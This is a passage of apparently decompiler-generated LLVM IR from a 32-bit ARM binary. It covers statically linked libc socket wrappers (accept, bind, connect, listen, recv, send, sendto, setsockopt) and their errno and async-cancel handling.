  %v4_dc44 = inttoptr i32 %v3_dc44 to i32*
  store i32 %v1_dc40, i32* %v4_dc44, align 4
  %v2_dc4c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_dc4c

dec_label_pc_dc4c:                                ; preds = %entry, %dec_label_pc_dc34
  %v1_dc50 = phi i32 [ %v0_dc24, %entry ], [ -1, %dec_label_pc_dc34 ]
  %v2_dc4c = phi i32 [ %v3_dc18, %entry ], [ %v2_dc4c.pre, %dec_label_pc_dc34 ]
  store i32 %v2_dc4c, i32* @r7, align 4
  ret i32 %v1_dc50

; uselistorder directives
  uselistorder i32 %v0_dc24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_dc4c, { 1, 0 }
}

define i32 @"$d.10"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_dc54:
  %v0_dc54 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_dc54, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_dc54
  %v2_dc54 = load i32, i32* @sp, align 4
  %v8_dc54 = shl i32 %v2_dc54, %arg2
  %v9_dc54 = and i32 %v8_dc54, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_dc54, %bb
  %v7_dc58 = phi i32 [ %arg1, %dec_label_pc_dc54 ], [ %v9_dc54, %bb ]
  ret i32 %v7_dc58

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_dc60 = load i32, i32* @r4, align 4
  store i32 %v3_dc60, i32* %stack_var_-20, align 4
  %v6_dc60 = load i32, i32* @r5, align 4
  %v9_dc60 = load i32, i32* @r6, align 4
  %v12_dc60 = load i32, i32* @r7, align 4
  %v4_dc6c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 15400) to i32*), align 4
  %v2_dc70 = icmp eq i32 %v4_dc6c, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_dc70, label %dec_label_pc_dc88, label %entry.dec_label_pc_dc94_crit_edge

entry.dec_label_pc_dc94_crit_edge:                ; preds = %entry
  br label %dec_label_pc_dc94

dec_label_pc_dc88:                                ; preds = %entry
  store i32 %v3_dc60, i32* @r4, align 4
  store i32 %v9_dc60, i32* @r6, align 4
  store i32 %v12_dc60, i32* @r7, align 4
  %v0_dc90 = call i32 @__sys_accept()
  br label %dec_label_pc_dc94

dec_label_pc_dc94:                                ; preds = %entry.dec_label_pc_dc94_crit_edge, %dec_label_pc_dc88
  %v0_dc94 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_dc94, i32* @r5, align 4
  %v0_dca4 = load i32, i32* @r4, align 4
  store i32 %v0_dca4, i32* @r0, align 4
  %v0_dca8 = call i32 @__sys_accept()
  store i32 %v0_dca8, i32* @r4, align 4
  %v0_dcb0 = load i32, i32* @r5, align 4
  %v1_dcb4 = call i32 @__libc_disable_asynccancel(i32 %v0_dcb0)
  %v0_dcb8 = load i32, i32* @r4, align 4
  %v2_dcc0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_dcc0, i32* @r4, align 4
  store i32 %v6_dc60, i32* @r5, align 4
  store i32 %v9_dc60, i32* @r6, align 4
  store i32 %v12_dc60, i32* @r7, align 4
  ret i32 %v0_dcb8

; uselistorder directives
  uselistorder label %dec_label_pc_dc94, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_dcd0 = load i32, i32* @r7, align 4
  store i32 %v3_dcd0, i32* %stack_var_-8, align 4
  %v0_dcdc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_dcdc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_dcdc, -4095
  br i1 %tmp, label %dec_label_pc_dd04, label %dec_label_pc_dcec

dec_label_pc_dcec:                                ; preds = %entry
  %v0_dcf0 = call i32 @__aeabi_read_tp()
  %v3_dcf4 = load i16, i16* @global_var_24070.401, align 2
  %v4_dcf4 = sext i16 %v3_dcf4 to i32
  %v0_dcf8 = load i32, i32* %r2.global-to-local, align 4
  %v1_dcf8 = sub i32 0, %v0_dcf8
  store i32 %v1_dcf8, i32* %r2.global-to-local, align 4
  %v3_dcfc = add i32 %v4_dcf4, %v0_dcf0
  %v4_dcfc = inttoptr i32 %v3_dcfc to i32*
  store i32 %v1_dcf8, i32* %v4_dcfc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_dd04.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_dd04

dec_label_pc_dd04:                                ; preds = %entry, %dec_label_pc_dcec
  %v1_dd08 = phi i32 [ %v0_dcdc, %entry ], [ -1, %dec_label_pc_dcec ]
  %v2_dd04 = phi i32 [ %v3_dcd0, %entry ], [ %v2_dd04.pre, %dec_label_pc_dcec ]
  store i32 %v2_dd04, i32* @r7, align 4
  ret i32 %v1_dd08

; uselistorder directives
  uselistorder i32 %v0_dcdc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dd04, { 1, 0 }
}

define i32 @"$d.9"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_dd0c:
  %v0_dd0c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_dd0c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_dd0c
  %v2_dd0c = load i32, i32* @sl, align 4
  %v8_dd0c = shl i32 %v2_dd0c, %arg2
  %v9_dd0c = and i32 %v8_dd0c, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_dd0c, %bb
  %v10_dd10 = phi i32 [ %arg1, %dec_label_pc_dd0c ], [ %v9_dd0c, %bb ]
  ret i32 %v10_dd10

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_dd14 = load i32, i32* @r7, align 4
  store i32 %v3_dd14, i32* %stack_var_-8, align 4
  %v0_dd20 = load i32, i32* @r0, align 4
  store i32 %v0_dd20, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_dd20, -4095
  br i1 %tmp, label %dec_label_pc_dd48, label %dec_label_pc_dd30

dec_label_pc_dd30:                                ; preds = %entry
  %v0_dd34 = call i32 @__aeabi_read_tp()
  %v3_dd38 = load i16, i16* @global_var_24070.401, align 2
  %v4_dd38 = sext i16 %v3_dd38 to i32
  %v0_dd3c = load i32, i32* %r2.global-to-local, align 4
  %v1_dd3c = sub i32 0, %v0_dd3c
  store i32 %v1_dd3c, i32* %r2.global-to-local, align 4
  %v3_dd40 = add i32 %v4_dd38, %v0_dd34
  %v4_dd40 = inttoptr i32 %v3_dd40 to i32*
  store i32 %v1_dd3c, i32* %v4_dd40, align 4
  %v2_dd48.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_dd48

dec_label_pc_dd48:                                ; preds = %entry, %dec_label_pc_dd30
  %v1_dd4c = phi i32 [ %v0_dd20, %entry ], [ -1, %dec_label_pc_dd30 ]
  %v2_dd48 = phi i32 [ %v3_dd14, %entry ], [ %v2_dd48.pre, %dec_label_pc_dd30 ]
  store i32 %v2_dd48, i32* @r7, align 4
  ret i32 %v1_dd4c

; uselistorder directives
  uselistorder i32 %v0_dd20, { 1, 0, 2 }
  uselistorder label %dec_label_pc_dd48, { 1, 0 }
}

define i32 @"$d.8"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_dd50:
  %v0_dd50 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_dd50, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_dd50
  %v2_dd50 = load i32, i32* @fp, align 4
  %v8_dd50 = shl i32 %v2_dd50, %arg2
  %v9_dd50 = and i32 %v8_dd50, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_dd50, %bb
  %v10_dd54 = phi i32 [ %arg1, %dec_label_pc_dd50 ], [ %v9_dd50, %bb ]
  ret i32 %v10_dd54

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_dd5c = load i32, i32* @r4, align 4
  store i32 %v3_dd5c, i32* %stack_var_-20, align 4
  %v6_dd5c = load i32, i32* @r5, align 4
  %v9_dd5c = load i32, i32* @r6, align 4
  %v12_dd5c = load i32, i32* @r7, align 4
  %v4_dd68 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 15400) to i32*), align 4
  %v2_dd6c = icmp eq i32 %v4_dd68, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_dd6c, label %dec_label_pc_dd84, label %entry.dec_label_pc_dd90_crit_edge

entry.dec_label_pc_dd90_crit_edge:                ; preds = %entry
  br label %dec_label_pc_dd90

dec_label_pc_dd84:                                ; preds = %entry
  store i32 %v3_dd5c, i32* @r4, align 4
  store i32 %v9_dd5c, i32* @r6, align 4
  store i32 %v12_dd5c, i32* @r7, align 4
  %v0_dd8c = call i32 @__sys_connect()
  br label %dec_label_pc_dd90

dec_label_pc_dd90:                                ; preds = %entry.dec_label_pc_dd90_crit_edge, %dec_label_pc_dd84
  %v0_dd90 = call i32 @__libc_enable_asynccancel()
  %v0_dd94 = load i32, i32* @r6, align 4
  store i32 %v0_dd94, i32* @r1, align 4
  store i32 %v0_dd90, i32* @r5, align 4
  %v0_dda0 = load i32, i32* @r4, align 4
  store i32 %v0_dda0, i32* @r0, align 4
  %v0_dda4 = call i32 @__sys_connect()
  store i32 %v0_dda4, i32* @r4, align 4
  %v0_ddac = load i32, i32* @r5, align 4
  %v1_ddb0 = call i32 @__libc_disable_asynccancel(i32 %v0_ddac)
  %v0_ddb4 = load i32, i32* @r4, align 4
  %v2_ddbc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_ddbc, i32* @r4, align 4
  store i32 %v6_dd5c, i32* @r5, align 4
  store i32 %v9_dd5c, i32* @r6, align 4
  store i32 %v12_dd5c, i32* @r7, align 4
  ret i32 %v0_ddb4

; uselistorder directives
  uselistorder label %dec_label_pc_dd90, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ddcc = load i32, i32* @r7, align 4
  store i32 %v3_ddcc, i32* %stack_var_-8, align 4
  %v0_ddd8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ddd8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_ddd8, -4095
  br i1 %tmp, label %dec_label_pc_de00, label %dec_label_pc_dde8

dec_label_pc_dde8:                                ; preds = %entry
  %v0_ddec = call i32 @__aeabi_read_tp()
  %v3_ddf0 = load i16, i16* @global_var_24070.401, align 2
  %v4_ddf0 = sext i16 %v3_ddf0 to i32
  %v0_ddf4 = load i32, i32* %r2.global-to-local, align 4
  %v1_ddf4 = sub i32 0, %v0_ddf4
  store i32 %v1_ddf4, i32* %r2.global-to-local, align 4
  %v3_ddf8 = add i32 %v4_ddf0, %v0_ddec
  %v4_ddf8 = inttoptr i32 %v3_ddf8 to i32*
  store i32 %v1_ddf4, i32* %v4_ddf8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_de00.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_de00

dec_label_pc_de00:                                ; preds = %entry, %dec_label_pc_dde8
  %v1_de04 = phi i32 [ %v0_ddd8, %entry ], [ -1, %dec_label_pc_dde8 ]
  %v2_de00 = phi i32 [ %v3_ddcc, %entry ], [ %v2_de00.pre, %dec_label_pc_dde8 ]
  store i32 %v2_de00, i32* @r7, align 4
  ret i32 %v1_de04

; uselistorder directives
  uselistorder i32 %v0_ddd8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_de00, { 1, 0 }
}

define i32 @__sys_recv() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_de0c = load i32, i32* @r7, align 4
  store i32 %v3_de0c, i32* %stack_var_-8, align 4
  %v0_de18 = load i32, i32* @r0, align 4
  store i32 %v0_de18, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_de18, -4095
  br i1 %tmp, label %dec_label_pc_de40, label %dec_label_pc_de28

dec_label_pc_de28:                                ; preds = %entry
  %v0_de2c = call i32 @__aeabi_read_tp()
  %v3_de30 = load i16, i16* @global_var_24070.401, align 2
  %v4_de30 = sext i16 %v3_de30 to i32
  %v0_de34 = load i32, i32* %r2.global-to-local, align 4
  %v1_de34 = sub i32 0, %v0_de34
  store i32 %v1_de34, i32* %r2.global-to-local, align 4
  %v3_de38 = add i32 %v4_de30, %v0_de2c
  %v4_de38 = inttoptr i32 %v3_de38 to i32*
  store i32 %v1_de34, i32* %v4_de38, align 4
  %v2_de40.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_de40

dec_label_pc_de40:                                ; preds = %entry, %dec_label_pc_de28
  %v1_de44 = phi i32 [ %v0_de18, %entry ], [ -1, %dec_label_pc_de28 ]
  %v2_de40 = phi i32 [ %v3_de0c, %entry ], [ %v2_de40.pre, %dec_label_pc_de28 ]
  store i32 %v2_de40, i32* @r7, align 4
  ret i32 %v1_de44

; uselistorder directives
  uselistorder i32 %v0_de18, { 1, 0, 2 }
  uselistorder label %dec_label_pc_de40, { 1, 0 }
}

define i32 @"$d.7"(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_de48:
  %v0_de48 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_de48, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_de48
  %v5_de48 = udiv i32 %arg4, 4
  %v6_de48 = and i32 %v5_de48, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_de48, %bb
  %v10_de4c = phi i32 [ %arg1, %dec_label_pc_de48 ], [ %v6_de48, %bb ]
  ret i32 %v10_de4c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_de54 = load i32, i32* @r4, align 4
  store i32 %v3_de54, i32* %stack_var_-24, align 4
  %v6_de54 = load i32, i32* @r5, align 4
  %v9_de54 = load i32, i32* @r6, align 4
  %v12_de54 = load i32, i32* @r7, align 4
  %v15_de54 = load i32, i32* @r8, align 4
  %v18_de54 = load i32, i32* @lr, align 4
  %v4_de60 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 15400) to i32*), align 4
  %v2_de64 = icmp eq i32 %v4_de60, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_de64, label %dec_label_pc_de7c, label %entry.dec_label_pc_de84_crit_edge

entry.dec_label_pc_de84_crit_edge:                ; preds = %entry
  br label %dec_label_pc_de84

dec_label_pc_de7c:                                ; preds = %entry
  store i32 %v3_de54, i32* @r4, align 4
  store i32 %v9_de54, i32* @r6, align 4
  store i32 %v12_de54, i32* @r7, align 4
  store i32 %v15_de54, i32* @r8, align 4
  %v0_de80 = call i32 @__sys_recv()
  br label %dec_label_pc_de84

dec_label_pc_de84:                                ; preds = %entry.dec_label_pc_de84_crit_edge, %dec_label_pc_de7c
  %v0_de84 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_de84, i32* @r5, align 4
  %v0_de98 = load i32, i32* @r4, align 4
  store i32 %v0_de98, i32* @r0, align 4
  %v0_de9c = call i32 @__sys_recv()
  store i32 %v0_de9c, i32* @r4, align 4
  %v0_dea4 = load i32, i32* @r5, align 4
  %v1_dea8 = call i32 @__libc_disable_asynccancel(i32 %v0_dea4)
  %v0_deac = load i32, i32* @r4, align 4
  %v2_deb0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_deb0, i32* @r4, align 4
  store i32 %v6_de54, i32* @r5, align 4
  store i32 %v9_de54, i32* @r6, align 4
  store i32 %v12_de54, i32* @r7, align 4
  store i32 %v15_de54, i32* @r8, align 4
  store i32 %v18_de54, i32* @lr, align 4
  ret i32 %v0_deac

; uselistorder directives
  uselistorder label %dec_label_pc_de84, { 1, 0 }
}

define i32 @__sys_send() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_dec0 = load i32, i32* @r7, align 4
  store i32 %v3_dec0, i32* %stack_var_-8, align 4
  %v0_decc = load i32, i32* @r0, align 4
  store i32 %v0_decc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_decc, -4095
  br i1 %tmp, label %dec_label_pc_def4, label %dec_label_pc_dedc

dec_label_pc_dedc:                                ; preds = %entry
  %v0_dee0 = call i32 @__aeabi_read_tp()
  %v3_dee4 = load i16, i16* @global_var_24070.401, align 2
  %v4_dee4 = sext i16 %v3_dee4 to i32
  %v0_dee8 = load i32, i32* %r2.global-to-local, align 4
  %v1_dee8 = sub i32 0, %v0_dee8
  store i32 %v1_dee8, i32* %r2.global-to-local, align 4
  %v3_deec = add i32 %v4_dee4, %v0_dee0
  %v4_deec = inttoptr i32 %v3_deec to i32*
  store i32 %v1_dee8, i32* %v4_deec, align 4
  %v2_def4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_def4

dec_label_pc_def4:                                ; preds = %entry, %dec_label_pc_dedc
  %v1_def8 = phi i32 [ %v0_decc, %entry ], [ -1, %dec_label_pc_dedc ]
  %v2_def4 = phi i32 [ %v3_dec0, %entry ], [ %v2_def4.pre, %dec_label_pc_dedc ]
  store i32 %v2_def4, i32* @r7, align 4
  ret i32 %v1_def8

; uselistorder directives
  uselistorder i32 %v0_decc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_def4, { 1, 0 }
}

define i32 @"$d.6"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_defc:
  %v0_defc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_defc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_defc
  %v5_defc = udiv i32 %arg2, 4
  %v6_defc = and i32 %v5_defc, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_defc, %bb
  %v7_df00 = phi i32 [ %arg1, %dec_label_pc_defc ], [ %v6_defc, %bb ]
  ret i32 %v7_df00

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_df08 = load i32, i32* @r4, align 4
  store i32 %v3_df08, i32* %stack_var_-24, align 4
  %v6_df08 = load i32, i32* @r5, align 4
  %v9_df08 = load i32, i32* @r6, align 4
  %v12_df08 = load i32, i32* @r7, align 4
  %v15_df08 = load i32, i32* @r8, align 4
  %v18_df08 = load i32, i32* @lr, align 4
  %v4_df14 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 15400) to i32*), align 4
  %v2_df18 = icmp eq i32 %v4_df14, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_df18, label %dec_label_pc_df30, label %entry.dec_label_pc_df38_crit_edge

entry.dec_label_pc_df38_crit_edge:                ; preds = %entry
  br label %dec_label_pc_df38

dec_label_pc_df30:                                ; preds = %entry
  store i32 %v3_df08, i32* @r4, align 4
  store i32 %v9_df08, i32* @r6, align 4
  store i32 %v12_df08, i32* @r7, align 4
  store i32 %v15_df08, i32* @r8, align 4
  %v0_df34 = call i32 @__sys_send()
  br label %dec_label_pc_df38

dec_label_pc_df38:                                ; preds = %entry.dec_label_pc_df38_crit_edge, %dec_label_pc_df30
  %v0_df38 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_df38, i32* @r5, align 4
  %v0_df4c = load i32, i32* @r4, align 4
  store i32 %v0_df4c, i32* @r0, align 4
  %v0_df50 = call i32 @__sys_send()
  store i32 %v0_df50, i32* @r4, align 4
  %v0_df58 = load i32, i32* @r5, align 4
  %v1_df5c = call i32 @__libc_disable_asynccancel(i32 %v0_df58)
  %v0_df60 = load i32, i32* @r4, align 4
  %v2_df64 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_df64, i32* @r4, align 4
  store i32 %v6_df08, i32* @r5, align 4
  store i32 %v9_df08, i32* @r6, align 4
  store i32 %v12_df08, i32* @r7, align 4
  store i32 %v15_df08, i32* @r8, align 4
  store i32 %v18_df08, i32* @lr, align 4
  ret i32 %v0_df60

; uselistorder directives
  uselistorder label %dec_label_pc_df38, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_df74 = load i32, i32* @r4, align 4
  store i32 %v3_df74, i32* %stack_var_-16, align 4
  %v0_df88 = load i32, i32* @r0, align 4
  store i32 %v0_df88, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_df88, -4095
  br i1 %tmp, label %dec_label_pc_dfb0, label %dec_label_pc_df98

dec_label_pc_df98:                                ; preds = %entry
  %v0_df9c = call i32 @__aeabi_read_tp()
  %v3_dfa0 = load i16, i16* @global_var_24070.401, align 2
  %v4_dfa0 = sext i16 %v3_dfa0 to i32
  %v0_dfa4 = load i32, i32* %r2.global-to-local, align 4
  %v1_dfa4 = sub i32 0, %v0_dfa4
  store i32 %v1_dfa4, i32* %r2.global-to-local, align 4
  %v3_dfa8 = add i32 %v4_dfa0, %v0_df9c
  %v4_dfa8 = inttoptr i32 %v3_dfa8 to i32*
  store i32 %v1_dfa4, i32* %v4_dfa8, align 4
  %v2_dfb0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_dfb0

dec_label_pc_dfb0:                                ; preds = %entry, %dec_label_pc_df98
  %v1_dfb4 = phi i32 [ %v0_df88, %entry ], [ -1, %dec_label_pc_df98 ]
  %v2_dfb0 = phi i32 [ %v3_df74, %entry ], [ %v2_dfb0.pre, %dec_label_pc_df98 ]
  store i32 %v2_dfb0, i32* @r4, align 4
  ret i32 %v1_dfb4

; uselistorder directives
  uselistorder i32 %v0_df88, { 1, 0, 2 }
  uselistorder label %dec_label_pc_dfb0, { 1, 0 }
}

define i32 @"$d.5"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_dfb8:
  %v0_dfb8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_dfb8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_dfb8
  %v5_dfb8 = udiv i32 %arg3, 4
  %v6_dfb8 = and i32 %v5_dfb8, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_dfb8, %bb
  %v7_dfbc = phi i32 [ %arg1, %dec_label_pc_dfb8 ], [ %v6_dfb8, %bb ]
  ret i32 %v7_dfbc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_dfc0 = load i32, i32* @r4, align 4
  store i32 %v3_dfc0, i32* %stack_var_-32, align 4
  %v6_dfc0 = load i32, i32* @r5, align 4
  %v9_dfc0 = load i32, i32* @r6, align 4
  %v12_dfc0 = load i32, i32* @r7, align 4
  %v15_dfc0 = load i32, i32* @r8, align 4
  %v18_dfc0 = load i32, i32* @sb, align 4
  %v21_dfc0 = load i32, i32* @sl, align 4
  %v24_dfc0 = load i32, i32* @lr, align 4
  %v4_dfd0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 15400) to i32*), align 4
  %v2_dfd8 = icmp eq i32 %v4_dfd0, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_dfd8, label %dec_label_pc_dff8, label %dec_label_pc_e004

dec_label_pc_dff8:                                ; preds = %entry
  store i32 %v3_dfc0, i32* @r4, align 4
  store i32 %v12_dfc0, i32* @r7, align 4
  store i32 %v15_dfc0, i32* @r8, align 4
  store i32 %v18_dfc0, i32* %sb.global-to-local, align 4
  %v0_e000 = call i32 @__sys_sendto()
  br label %dec_label_pc_e004

dec_label_pc_e004:                                ; preds = %entry, %dec_label_pc_dff8
  %v0_e004 = call i32 @__libc_enable_asynccancel()
  %v0_e008 = load i32, i32* @r7, align 4
  store i32 %v0_e008, i32* @r1, align 4
  store i32 %v0_e004, i32* @r5, align 4
  %v0_e018 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_e018, i32* @r0, align 4
  %v0_e020 = call i32 @__sys_sendto()
  store i32 %v0_e020, i32* @r4, align 4
  %v0_e028 = load i32, i32* @r5, align 4
  %v1_e02c = call i32 @__libc_disable_asynccancel(i32 %v0_e028)
  %v0_e030 = load i32, i32* @r4, align 4
  %v2_e038 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_e038, i32* @r4, align 4
  store i32 %v6_dfc0, i32* @r5, align 4
  store i32 %v9_dfc0, i32* @r6, align 4
  store i32 %v12_dfc0, i32* @r7, align 4
  store i32 %v15_dfc0, i32* @r8, align 4
  store i32 %v18_dfc0, i32* @sb, align 4
  store i32 %v21_dfc0, i32* @sl, align 4
  store i32 %v24_dfc0, i32* @lr, align 4
  ret i32 %v0_e030

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e004, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_e048 = load i32, i32* @r4, align 4
  store i32 %v3_e048, i32* %stack_var_-12, align 4
  %v0_e058 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e058, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_e058, -4095
  br i1 %tmp, label %dec_label_pc_e080, label %dec_label_pc_e068

dec_label_pc_e068:                                ; preds = %entry
  %v0_e06c = call i32 @__aeabi_read_tp()
  %v3_e070 = load i16, i16* @global_var_24070.401, align 2
  %v4_e070 = sext i16 %v3_e070 to i32
  %v0_e074 = load i32, i32* %r2.global-to-local, align 4
  %v1_e074 = sub i32 0, %v0_e074
  store i32 %v1_e074, i32* %r2.global-to-local, align 4
  %v3_e078 = add i32 %v4_e070, %v0_e06c
  %v4_e078 = inttoptr i32 %v3_e078 to i32*
  store i32 %v1_e074, i32* %v4_e078, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_e080.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_e080

dec_label_pc_e080:                                ; preds = %entry, %dec_label_pc_e068
  %v1_e084 = phi i32 [ %v0_e058, %entry ], [ -1, %dec_label_pc_e068 ]
  %v2_e080 = phi i32 [ %v3_e048, %entry ], [ %v2_e080.pre, %dec_label_pc_e068 ]
  store i32 %v2_e080, i32* @r4, align 4
  ret i32 %v1_e084

; uselistorder directives
  uselistorder i32 %v0_e058, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e080, { 1, 0 }
}

define i32 @"$d.4"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_e088:
  %v0_e088 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e088, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_e088
  %v2_e088 = load i32, i32* @r6, align 4
  %v5_e088 = udiv i32 %v2_e088, 4
  %v6_e088 = and i32 %v5_e088, %arg1
  %v1_e08c = load i32, i32* @r5, align 4
  store i32 %v1_e08c, i32* %arg2, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e088, %bb
